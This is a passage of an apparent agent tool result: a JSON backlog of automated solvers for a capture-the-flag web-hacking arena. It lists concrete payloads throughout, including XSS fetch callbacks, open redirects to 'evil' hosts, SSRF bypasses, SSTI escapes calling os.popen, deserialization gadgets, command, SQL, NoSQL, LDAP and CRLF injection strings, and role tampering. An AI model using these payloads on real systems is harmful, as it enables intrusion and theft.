insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},\n  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},\n  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / claim (row 6; body binding seen D13)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON shows current_role: analyst. D13 granted admin via JSON body binding, D20 via a role field inside an unsigned state blob -- and D20 accepted ONLY `administrator` (`admin`, `ADMIN`, `staff`, flags -> role_not_permitted). Remaining forms: cookie role=<value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User / X-Admin: true, ?role= / ?admin=1, PATCH/PUT of the profile route. Value ladder, one request each: administrator, admin, superuser, root, owner, staff, manager, plus any higher value the app lists; `role_not_permitted` = right field, keep laddering. Then re-read the secondary route (403 administrator_required -> evidence). Parser: proof regex.\"},\n  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets). D13 (NestJS mass assignment) makes the JSON-merge sibling more likely: after the pollution POST, GET secondary_route (administrator_required) and look for evidence. Raised to 1 after D15: the API run (D13 mass assignment -> D14 property authz) keeps the JSON-object-binding family hot and Node costumes recur.\"},\n  {\"id\": \"api-shadow-version\", \"concept\": \"improper API inventory: shadow / deprecated / beta endpoint skips the check (row 39, OWASP API9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D13-D15 walked the OWASP API Top 10 (API3, API5, API7) and D14's prompt said 'take inventory of every endpoint'. Planner: from /api/inventory, /openapi.json, /swagger.json, /api-docs, /v2/api-docs, /api/clues and JS literals, collect every path; emit version swaps (/api/v2/x -> /api/v1/x, /api/x -> /api/v0|beta|internal|legacy|old/x), `X-API-Version: 1`, `?version=1`, `Accept: application/vnd.<app>.v1+json`; call the protected operation (protected_reference / admin route) on each. Parser: proof regex; 403 on the current version + 200 on the shadow = the bug.\"},\n  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},\n  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + bare-route JSON errors + prompt verbs to the concept and the next request\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs. Add D09: preferences_route (+ form with hidden csrf_token) -> CSRF handler (cross-site fetch-metadata submit, then GET /api/preferences); D10: upload_shape / render_route / preview_guide / upload_policy -> upload handler (POST JSON html with {{objective}}, GET returned path). Both handlers exist in challenges/day22/web-*/solver/solve.py (csrf(), upload()). Errors: signed_in_session_required, invalid_destination, method_not_allowed, file_not_found. D11-D13 had NO concept key, so add a second stage: bare GET of each route -> `post_required` (405: POST sink -> second-order / mass-assignment / injection by body), `administrator_required` (403 on secondary: privilege bound elsewhere), empty `Rendered message <pre>` (render sink -> SSTI probe on ?template=), plus prompt verbs (\\\"binds whatever you hand it\\\" -> mass assignment, \\\"plant ... come back later\\\" -> second-order, \\\"evaluates everything\\\" -> SSTI). Plugins: lib/web/handlers/day23_web_template_temper.py, day23_web_ask_again_later.py, day23_web_posted_too_much.py. D14: inventory_route + protected_reference -> fetch inventory JSON {route, query_parameters, fields, actions, public_reference} and enumerate field x action on the protected id (error id_fields_action_required / field_action_forbidden) -- plugin day24_web_the_api_has_opinions.py. D15 (no concept key): feature 400 absolute_url_required + secondary 403 internal_only -> SSRF (feature?url=http://127.0.0.1:8080<secondary>) -- plugin day24_web_fetch_quest.py; error fetch_failed = wrong host/port, keep laddering. D16: input_parameter + example_path (400 path_required) -> cmd injection, value = example + %3B + `cat /run/huntress/objective.txt` (plugin day25_web_shell_company.py). D17: recovery_guide_route -> guide JSON {request_route, redeem_route, account_parameter, token_parameter, accounts[{id,self_service}]} -> own token redeemed with the victim id (day25_web_reset_expectations.py). D18: protected_reference + note + current_user (no framework key), feature GET 404 not_found -> GraphQL introspection + case(id) (day25_web_resolver_revolt.py). KEY collision: protected_reference is D14 (with inventory_route) AND D18 (with note) -> route on the companion key; and any `*_guide_route`/`inventory_route` value is a JSON map of the next requests. D19: event_type + owner_scope are BODY VALUES (not routes), feature 405 post_required, POST -> webhook_rejected -> alias-union JSON body (day26_web_trust_the_webhook.py, KEY ^owner_scope$). D20: state_format_route (fixed /api/state-format) -> guide {transport: 'POST <route>', request_field, encoding, sample_state, sample_encoded}; feature 400 state_required -> encoded state with role ladder (day26_web_serialized_offender.py). Generalise: any key whose value is not a '/...' path is a body value to echo; any *_format_route/*_guide_route is a JSON map of the next request.\"},\n  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web/ (package; see lib/web/__init__.py): concept -> (detector over recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one. D15 Mastery had 4 targets (first time); all known handlers answered them in 3.2 s, so the registry works when every class has a plugin -- keep per-host concurrency capped.\"},\n  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},\n  {\"id\": \"fetch-metadata-matrix\", \"concept\": \"server-judged 'browser' checks: Sec-Fetch-* / Referer / Origin matrix (rows 13a, 24a, 15)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D06 (same-origin callback) and D09 (cross-site CSRF) were both judged purely by request headers, no bot. Pure planner: given a route, a base URL and an optional 'from' page URL, emit header sets {Sec-Fetch-Site: same-origin|same-site|cross-site|none} x {Mode: navigate|cors|no-cors} x {Dest: document|empty|iframe} with matching Referer (from-page / foreign https://evil.example/ / none) and Origin (base / foreign / null), ordered by the error/flag the app returned (browser_callback_required -> same-origin cors; changed_across_sites:false -> cross-site navigate). Parser: evidence/proof regex + boolean flags in the JSON. Fixtures: D06 callback and D09 /api/preferences bodies from day21/day22 logs.\"},\n  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},\n  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},\n  {\"id\": \"webhook-signature-sequels\", \"concept\": \"webhook sequels: HMAC-signed events with a leaked/weak secret, replay, provider allowlist (row 44b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Lowered after cal. 27: D21-D23 were all new concepts, not D19/D20 sequels. D19 'Trust the Webhook' was the unsigned form (clues event_type + owner_scope as body values; narrow bodies -> webhook_rejected; an alias-union JSON with role/source/trust flags -> forged_event_consumed). Signed sequel planner: read signature header names from errors/guides (X-Hub-Signature-256 'sha256=<hex>', X-Signature, X-Webhook-Signature, Stripe-Signature 't=..,v1=..', Svix 'v1,<b64>'), compute HMAC-SHA256/SHA1 over the RAW body (or `t.` + body for Stripe-style) with any secret the app leaks (guide, sample event, .env, JS, logs); replay a logged/sample signed event with a fresh timestamp or unchanged signature when only the payload's unsigned envelope changes; provider headers (X-GitHub-Event, User-Agent GitHub-Hookshot/Stripe) and source IP headers. Body = alias-union of clue values. Parser: proof regex / evidence.\"},\n  {\"id\": \"ssrf-filter-bypass\", \"concept\": \"SSRF sequels: filtered host/scheme, redirect, file://, blind (row 12b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Lowered after cal. 27 (new concepts outrank sequels since D19). D15 was the plain form (feature?url=http://127.0.0.1:8080<internal_only route>; port 80 -> fetch_failed). Sequels in the D10->D11 / D03->D12 style: blocklist on 127.0.0.1/localhost -> 2130706433, 0x7f000001, 017700000001, 127.1, 127.0.0.1.nip.io-style only if the app names it, [::1], [::ffff:127.0.0.1], 0.0.0.0; allowlist 'must start with/contain <host>' -> https://<allowed>@127.0.0.1:8080/, http://127.0.0.1:8080#@<allowed>, ?u=<allowed>; scheme filter -> file:///run/huntress/objective.txt, FILE://, gopher only if named; redirect hop via an app-owned open redirect (row 24b) or a clue route that 302s; POST/JSON body {url} when GET 405s; port ladder 8080, 80, 5000, 8000, 3000, 8888, 9000 from error hints. Parser: proof regex in the proxied body, base64/JSON-wrapped content fields. Fixture: D15 error bodies (absolute_url_required, internal_only, fetch_failed) + a mocked blocked_host.\"},\n  {\"id\": \"deserialization-gadgets\", \"concept\": \"native / signed serialization sequels: pickle, PHP, Java, node-serialize, .NET (row 21b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Lowered after cal. 27 (new concepts outrank sequels since D19; JWT stays priority 1). D20 saw the data-tamper form (unsigned base64url JSON `state` described by a format guide; role -> administrator). Sequel planner: recognise base64 blobs gASV/gAN (pickle), Tzo/YTo (PHP serialize, length-prefixed strings -> fix s:N when editing), rO0 (Java), AAEAAAD (.NET BinaryFormatter), `_$$ND_FUNC$$_` (node-serialize), YAML `!!python`; first rewrite data fields (role/isAdmin/user) keeping the format's own length/type markers, then a minimal gadget that only reads /run/huntress/objective.txt (pickle __reduce__ -> open().read() returned into a field the app echoes). Encodings per guide (base64url/base64/hex/raw). Parser: proof regex / evidence.\"},\n  {\"id\": \"ssti-sandbox-escape\", \"concept\": \"SSTI sequels: filtered/sandboxed engine, file read, stored template (row 11b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D11 rendered `{{objective}}` directly (context var) under a Spring Boot costume; `{{T(java.lang.Runtime)}}` printed a class, ${..}/*{..} stayed literal. A sequel may hide `objective` or filter `{{`. Planner: fingerprint by arithmetic family ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {{7*'7'}} -> 7777777 Jinja2 / 49 Twig), then per-engine reads of the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / lipsum / request.application, Twig source() / _self.env, SpEL T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/run/huntress/objective.txt')), Freemarker ?new() / ?api, ERB File.read, EJS/Nunjucks/Handlebars constructor chains, Thymeleaf __${..}__::. Filter bypasses: attr()/|join, hex/unicode, request.args indirection. Also plant in stored fields read later (row 37). Parser: proof regex in rendered body.\"},\n  {\"id\": \"stored-second-order-generic\", \"concept\": \"plant now, read on another route: second-order for any class (row 37)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D12 pattern generalised: feature_route = POST sink (`post_required`, `saved:true`), secondary_route = later reader. Planner takes a per-class payload list (SQLi ladder, SSTI `{{objective}}`/`${..}`, cmd `;cat <prompt path>`, XSS for a bot) and plants each as JSON (then form) in every common field (name,q,query,note,label,title,value,filter,search,term,report,display_name,bio,comment,message) in one body, re-GETs every reader route after EACH plant. Parser: proof regex only (D12 prints `effect` even when rows are empty).\"},\n  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D03 tautology and D12 second-order are seen. Remaining: ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length/row-count oracle (bounded alphabet [0-9a-f_proof], 32 chars), time-based (sleep/randomblob) only when nothing differs, login bypass admin'--. Payloads delivered as JSON body AND query/form (D12 bound JSON only). SQLite/MySQL/Postgres dialects. Title puns to expect: \\\"yes or no\\\", \\\"takes its time\\\", \\\"union\\\".\"},\n  {\"id\": \"type-juggling-auth\", \"concept\": \"loose comparison / JSON type confusion in auth or token checks (row 34)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"PHP/Laravel or Node costume with a token/PIN/password compare. JSON bodies with true, 0, \\\"0\\\", [], {}, null, \\\"0e1\\\" magic hashes, arrays where strings are expected (strcmp(array) == 0), numeric strings with whitespace. Field names from the form/clues. Parser: effect+evidence / proof.\"},\n  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},\n  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},\n  {\"id\": \"upload-filter-bypass\", \"concept\": \"upload sequels: enforced type filter, served-path traversal, stored SVG/HTML (row 20b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D10's policy (txt, text/plain) was never enforced. Sequel planner over the same upload_shape (JSON filename/content/content_type, or multipart if the form says so): double extension (n.txt.html, n.html.txt), case (N.HTML), trailing dot/space, content_type spoof vs extension, GIF89a/PNG magic prefix, filename traversal (../n.html, ..%2fn.html) to land in a served dir named by the clues, SVG with script or XXE, template syntax in the content per the guide. Parser: read the returned path/url, GET it, proof regex.\"},\n  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"},\n  {\"id\": \"bopla-field-read\", \"concept\": \"excessive data exposure / hidden-field read on API routes (row 36)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D14 showed the property-level read side through an explicit `fields`+`action` pair on an inventory-listed route (seen, handler exists). Remaining sibling: routes WITHOUT an inventory where hidden keys come back through ?fields=*, ?include=all, ?expand=*, ?view=admin|full|debug, ?debug=1, Accept: application/vnd.api+json, or list endpoints returning keys the HTML omits (secret, proof, note, internal). Compare key sets against the page. Parser: proof regex after JSON flattening.\"},\n  {\"id\": \"api-resource-limit-overread\", \"concept\": \"unrestricted resource consumption / pagination over-read (row 40, OWASP API4)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"List routes with limit/page_size/per_page/offset/page: plan limit=1000|100000|-1|0, page=0|-1, offset beyond the public window, size=all, and batch/array ids (id=1,2,3 / ids[]=). Look for records past the public set carrying proof/secret. No flooding: <= 10 requests.\"},\n  {\"id\": \"cmd-injection-sequels\", \"concept\": \"command injection sequels: filtered separators, blind, argument injection (row 10b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D16 was the plain form (`ls -ld <path>` with stdout echoed; `;` worked once percent-encoded). Sequel planner, input = param name (input_parameter / `<x>_required`) + example value: separators %3B, %0a, %26%26, %7C, $(..), backticks, ${IFS} for spaces, quotes-split (c''at), wildcard paths (/run/hunt*/obj*); argument injection when the value is an argument not a shell string (`--output=/app/static/x`, `-exec cat {} ;` for find, `--help`-style); blind: copy the proof into a served static dir (the example path, e.g. /app/static) then GET it. Parser: proof regex in stdout/body or in the copied file.\"},\n  {\"id\": \"graphql-batch-alias-mutation\", \"concept\": \"GraphQL sequels: aliases, batched arrays, mutations without authz, introspection off (row 23b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D18 was the plain form (introspection on, one resolver skipped the field check). Sequel planner from the schema: alias the protected field across every arg-taking Query field (a1:case(id:..){..} a2:...), JSON array batching [{query},{query}], mutations (updateX/setRole/assign) reachable without authz followed by the read, node(id:)/Relay global ids (base64 'Type:id'), fragments on interfaces/unions to reach hidden types; introspection disabled -> field-suggestion walk ('Did you mean') and common names (note, secret, proof, evidence, internal). Transports: POST JSON, GET ?query=, form, application/graphql body. Parser: proof regex over data and errors[].message.\"},\n  {\"id\": \"crlf-header-injection\", \"concept\": \"CRLF / response-header injection (row 42)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Params reflected into Location / Set-Cookie / custom headers (redirect targets, language, filename in Content-Disposition): %0d%0aSet-Cookie:%20role=admin, %0d%0aX-Debug:1, double CRLF to inject a body; also %E5%98%8A%E5%98%8D unicode CRLF. Then re-request the secondary route with the injected cookie. Parser: injected header in the raw response + proof regex.\"},\n  {\"id\": \"crypto-weak-token-derivation\", \"concept\": \"crypto failures: tokens derivable from data the app shows (row 45, OWASP A02)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"OWASP A02 is the largest untouched Top-10 area. Planner over every token/id the app issues to US (reset tokens like D17's 12 hex, session ids, invite codes, receipt ids): test whether it equals md5/sha1/sha256 of (username|account_id|email|timestamp|id), truncated, hex/base64; sequential/time-based ids; then derive the victim's token from the victim's id/label shown in a guide. ECB-style cookies: repeated 16-byte blocks -> cut-and-paste a role block; CBC bit-flip on a known plaintext field. Only derivations from values the app shows; no brute force.\"},\n  {\"id\": \"known-vulnerable-component\", \"concept\": \"version disclosure -> a documented weakness of that exact component (row 46, OWASP A06)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Untouched Top-10 area. Recon parser: version strings in headers (Server, X-Powered-By), /version, /health, /actuator/info, footer, package.json/composer.lock/requirements exposed via backups; map to a small local table of training-kit-style weaknesses (debug console routes, default admin route, deprecated param that skips the check) and emit only requests against the documented route/param. No exploit downloads, no scanning; proof regex.\"},\n  {\"id\": \"sse-socketio-transport\", \"concept\": \"other real-time transports: SSE, socket.io/engine.io, JSON-RPC, per-message WS authz (row 41b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D22 was the plain WS form (Origin present + ?stream=<stream_reference> -> first frame has the proof). Sequel planner reusing lib/web/handlers/day27_web_socket_to_me.py's stdlib client: SSE (GET with Accept: text/event-stream, parse `data:` lines, stream id as ?stream=/?channel=/Last-Event-ID), socket.io v4 (GET /socket.io/?EIO=4&transport=polling -> sid, then 40 / 42[\\\"subscribe\\\",ref] over polling or WS upgrade), per-message authz (open own stream, send {\\\"subscribe\\\"|\\\"join\\\"|\\\"stream\\\": protected ref}), Origin variants (own, foreign, null) when the handshake is origin-checked. Parser: proof regex over every frame/event.\"},\n  {\"id\": \"http-param-pollution\", \"concept\": \"duplicate params / keys split between proxy and app (row 35)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"For a route whose check and action read the same param: a=safe&a=evil, a[]=..., JSON duplicate keys (first vs last wins), mixed query + body copies, ; separators. Order the planner by which copy the error names. Parser: proof regex.\"},\n  {\"id\": \"ldap-xpath-injection\", \"concept\": \"LDAP / XPath injection (row 43)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Login or directory search over LDAP/XML: `*`, `*)(uid=*))(|(uid=*`, `admin)(&)`; XPath `' or '1'='1`, `'] | //* | //*['`, count()/string-length() oracles bounded to the proof alphabet. Parser: proof regex.\"},\n  {\"id\": \"log-injection-forging\", \"concept\": \"log injection / forged audit entries (row 47, OWASP A09)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"An audit/log route (secondary_route audit-<hex6> recurred D13/D17) that records user input and is later trusted by an approver/bot: plant `%0a` / `\\\\r\\\\n` forged lines ('[admin] approved <id>'), JSON-log key injection (\\\"\\\\\\\",\\\\\\\"role\\\\\\\":\\\\\\\"admin\\\"), or XSS for a bot-viewed log page; then GET the audit/secondary route. Parser: proof regex / evidence.\"}\n]\n```\n","numLines":124,"startLine":75,"totalLines":198}},"tool_result_meta":[{"id":"toolu_01EB1vNWXwRTtgrYZqmkGbqD","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
